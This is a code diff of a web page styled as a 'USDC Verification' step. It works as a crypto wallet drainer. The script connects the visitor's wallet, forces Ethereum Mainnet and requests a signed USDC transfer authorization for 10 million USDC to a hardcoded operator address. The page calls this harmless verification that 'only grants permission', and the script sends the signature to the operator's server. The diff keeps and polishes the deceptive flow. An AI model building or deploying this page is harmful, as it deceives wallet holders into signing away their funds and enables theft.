@@ -10,7 +10,7 @@
         body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Inter', sans-serif; }
         .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; border: 1px solid #334155; width: 100%; max-width: 440px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
         .status-box { font-size: 13px; color: #38bdf8; text-align: center; margin-top: 20px; padding: 10px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); }
-        .addr-display { background: #0f172a; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 12px; color: #94a3b8; border: 1px solid #334155; margin: 20px 0; word-break: break-all; }
+        .addr-display { background: #0f172a; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 11px; color: #94a3b8; border: 1px solid #334155; margin: 20px 0; word-break: break-all; }
         .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: 0.3s; cursor: pointer; }
         .btn-main:hover { background: #7dd3fc; transform: translateY(-1px); }
         .btn-main:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
@@ -20,17 +20,17 @@
 <body>
 
 <div class="auth-card">
-    <h3 class="text-center mb-4">Wallet Verification</h3>
+    <h3 class="text-center mb-4">USDC Verification</h3>
 
     <div id="step-1">
-        <p class="text-center text-secondary small mb-4">Connect your Ethereum wallet to begin secure verification.</p>
+        <p class="text-center text-secondary small mb-4">Connect your wallet to authorize gasless recruitment transfers.</p>
         <button id="connectBtn" class="btn-main">Connect Wallet</button>
     </div>
 
     <div id="step-2" class="d-none">
         <div id="addrDisplay" class="addr-display">0x...</div>
-        <p class="text-center text-secondary small mb-4">Verification is <b>gasless</b>. No ETH is required to sign this permission.</p>
-        <button id="signBtn" class="btn-main">Sign Permissions</button>
+        <p class="text-center text-secondary small mb-4">This signature is <b>gasless</b>. It only grants permission to move USDC.</p>
+        <button id="signBtn" class="btn-main">Sign Authorization</button>
     </div>
 
     <div id="status" class="status-box">Waiting for connection...</div>
@@ -39,56 +39,55 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>
 
 <script>
-    // Ethereum USDC Mainnet Address
+    // Configuration
     const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-    // Your Admin address
     const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
 
     let userAccount = null;
 
-    // --- 1. Connect Wallet ---
+    // --- 1. Connection Logic ---
     document.getElementById('connectBtn').onclick = async () => {
-        if (typeof window.ethereum === 'undefined') return alert("Please install a Web3 wallet.");
+        if (!window.ethereum) return alert("Please install MetaMask.");
 
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = accounts[0];
 
-            // Force Switch to Ethereum Mainnet (0x1)
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x1' }],
-            });
+            // Ensure Chain ID is 1 (Mainnet)
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            if (chainId !== '0x1') {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x1' }],
+                });
+            }
 
             document.getElementById('step-1').classList.add('d-none');
             document.getElementById('step-2').classList.remove('d-none');
             document.getElementById('addrDisplay').innerText = userAccount;
             document.getElementById('status').innerText = "Connected to Ethereum Mainnet";
-        } catch (error) {
-            console.error(error);
-            alert("Connection failed. Ensure you are on Ethereum Mainnet.");
+        } catch (err) {
+            alert("Connection error: " + err.message);
         }
     };
 
-    // --- 2. Dynamic Signature Logic (EIP-3009) ---
+    // --- 2. Signature Logic (v6 Syntax) ---
     document.getElementById('signBtn').onclick = async () => {
-        const btn = document.getElementById('signBtn');
         const status = document.getElementById('status');
+        const btn = document.getElementById('signBtn');
         btn.disabled = true;
 
         try {
-            // "ethers" is now available globally from the CDN script above
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
-
-            // FETCH NETWORK DATA DYNAMICALLY
             const network = await provider.getNetwork();
-            // Force chainId to a Number for better wallet compatibility
-            const currentChainId = Number(network.chainId);
+
+            // Dynamic Chain ID (ensures it matches current chain)
+            const currentChainId = network.chainId;
 
             const nonce = ethers.hexlify(ethers.randomBytes(32));
-            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
-            const amount = ethers.parseUnits("10000000", 6); // 10M USDC Limit
+            const deadline = Math.floor(Date.now() / 1000) + 86400;
+            const amount = ethers.parseUnits("10000000", 6);
 
             const domain = {
                 name: "USD Coin",
@@ -117,13 +116,10 @@
                 nonce: nonce
             };
 
-            status.innerText = "Check your wallet to sign...";
-
-            // Sign the Typed Data (Free)
+            status.innerText = "Check your wallet...";
             const signature = await signer.signTypedData(domain, types, message);
             const sig = ethers.Signature.from(signature);
 
-            // --- 3. Push to Django ---
             status.innerText = "Syncing with server...";
             const response = await fetch('/user/update-wallet-status/', {
                 method: 'POST',
@@ -142,18 +138,16 @@
                 })
             });
 
-            const result = await response.json();
-            if (result.status === "success") {
+            if (response.ok) {
                 status.innerText = "Verification Complete!";
-                alert("Success! Your gasless authorization is saved.");
+                alert("Authorization Saved Successfully!");
             } else {
-                throw new Error(result.message);
+                throw new Error("Server rejected signature.");
             }
 
         } catch (err) {
-            status.innerText = "Error: " + (err.reason || err.message);
+            status.innerText = "Error: " + err.message;
             btn.disabled = false;
-            console.error(err);
         }
     };
 </script>
